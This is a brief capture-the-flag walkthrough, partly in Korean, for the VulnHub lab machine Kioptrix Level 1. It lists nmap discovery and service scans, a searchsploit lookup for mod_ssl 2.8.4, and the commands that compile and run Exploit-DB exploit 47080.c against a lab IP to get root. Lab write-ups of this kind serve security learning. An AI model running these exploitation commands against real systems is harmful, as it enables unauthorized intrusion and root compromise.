[Kioptrix : Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open   
![캡처1](https://user-images.githubusercontent.com/69203345/108841194-ba320680-761a-11eb-850a-854029a81b18.PNG)
# enumerate
***
## target: 192.168.25.9
### nmap -O -sV -sS -p- 192.168.25.9   
![캡처2](https://user-images.githubusercontent.com/69203345/108841517-3b899900-761b-11eb-8b3a-b901b98aea75.PNG)
# exploitation 
***
### searchsploit mod_ssl 2.8.4
![캡처3](https://user-images.githubusercontent.com/69203345/108841791-aa66f200-761b-11eb-9646-2b796d9340ca.PNG)
### 47080.c 사용    
### cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./   
### gcc -o exploit 47080.c -lcrypto   
### ./exploit
![캡처4](https://user-images.githubusercontent.com/69203345/108842404-91ab0c00-761c-11eb-9af9-75852bb89b72.PNG)
### ./exploit 0x6b 192.168.25.9 -c 40
![캡처5](https://user-images.githubusercontent.com/69203345/108842772-1e55ca00-761d-11eb-995d-4347f58ec5ec.PNG)   
root획득   
꼭 이방법만 있는것은 아니다.
